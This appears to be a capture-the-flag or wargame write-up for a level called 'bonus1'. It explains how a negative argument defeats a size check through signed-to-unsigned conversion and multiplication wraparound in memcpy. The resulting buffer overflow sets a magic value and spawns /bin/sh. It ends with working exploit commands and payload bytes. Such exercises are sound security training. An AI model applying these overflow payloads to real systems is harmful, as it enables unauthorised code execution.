# bonus1

This program takes in a number as first parameter and a string as second parameter.
We need the number to be exactly `0x574f4c46` to have the program call `/bin/sh` but
the problem is the first `if` doesn't let us through if the number is greater than 9.
A solution would be to overflow the buffer with memcpy but we can't overflow it with a
number under 11. The solution to this problem is to use a negative number that will
bypass the `if` check and, because `memcpy` takes as `size_t` (`unsigned int`), the
number that is negative will be viewed as positive number by `memcpy`. Now another
problem appears: this number will be too big ! And the solution to this is to use
the fact that the number is multiplied by 4 before being passed to `memcpy` to
overflow it and bring it back to a small number.

Revised by ChatGPT:  
This program takes two parameters: a number as the first parameter and a string as the second
parameter. The challenge is to make the number exactly `0x574f4c46` in order for the program to
execute `/bin/sh`. However, the first if statement prevents us from proceeding if the number is
greater than 9.  
The solution involves overflowing the buffer using `memcpy`, but we cannot overflow it with a
number less than 11. To circumvent this limitation, we use a negative number, which bypasses the
if check. Since memcpy takes its size argument as `size_t` (an `unsigned integer`), the negative
number is interpreted as a large positive number by `memcpy`.  
However, another issue arises: this positive number is too large! To address this, we leverage
the fact that the number is multiplied by 4 before being passed to `memcpy`, causing it to
overflow and wrap around to a smaller number.

## Useful infos

value compared: 0x574f4c46 = 1464814662

position of atoi ret: [esp+0x3c]

AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ[KKKK]

exploit: `echo -en "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ\x46\x4c\x4f\x57"`  

doesn't work: `./bonus1 -2147483648 $(echo -en "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ\x46\x4c\x4f\x57")`  

works: `./bonus1 -2147483637 $(echo -en "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ\x46\x4c\x4f\x57")`  